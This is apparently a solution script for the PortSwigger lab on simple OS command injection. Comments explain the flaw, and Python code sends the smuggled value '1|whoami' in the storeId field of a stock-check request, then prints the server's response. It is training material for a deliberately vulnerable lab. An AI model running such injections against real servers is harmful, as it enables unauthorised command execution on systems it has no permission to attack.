# Lab 01 — OS command injection, simple case
# PortSwigger: https://portswigger.net/web-security/os-command-injection/lab-simple
#
# Vulnerability: Product stock checker executes a shell command containing
#                user-supplied productID and storeID, returning the raw
#                command output directly in the response
# Aim:           Execute whoami to determine the name of the current user
#
# Technique:
#   The storeId parameter is concatenated directly into a server-side shell
#   command. Piping a second command onto the end causes the shell to run
#   BOTH commands, with both outputs appended into the same response body.
#
#     storeId = 1|whoami
#     → server runs something like: stockreport.sh 1 1|whoami
#     → response contains the normal stock count AND the whoami output
#
# Usage: python os_command_injection_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from os_command_injection_utils import banner, section, make_session, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PRODUCT_ID = "1"
INJECTED_STORE_ID = "1|whoami"

if __name__ == "__main__":
    banner()
    section("LAB 01 — OS COMMAND INJECTION, SIMPLE CASE")

    if len(sys.argv) != 2:
        print("  Usage: python os_command_injection_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm the baseline stock check works normally ─────────────
    print("  ── Step 1: confirm the baseline stock check\n")
    r_baseline = session.post(
        f"{url}/product/stock",
        data={"productId": PRODUCT_ID, "storeId": "1"}
    )
    check_status(r_baseline, 200, "Baseline stock check")
    print_box("Baseline response", r_baseline.text)

    # ── Step 2: inject the pipe + whoami into storeId ────────────────────────
    print("  ── Step 2: inject '|whoami' into storeId\n")
    print(f"  ➜  Payload: {INJECTED_STORE_ID}\n")

    r = session.post(
        f"{url}/product/stock",
        data={"productId": PRODUCT_ID, "storeId": INJECTED_STORE_ID}
    )
    check_status(r, 200, "Command injection request")
    print_box("Response (should contain whoami output)", r.text)

    print()
    print("  ℹ  The pipe (|) chains a second command onto the original one.")
    print("     Both commands' output typically appear concatenated in the")
    print("     response body — read the FULL response, not just the first line.")
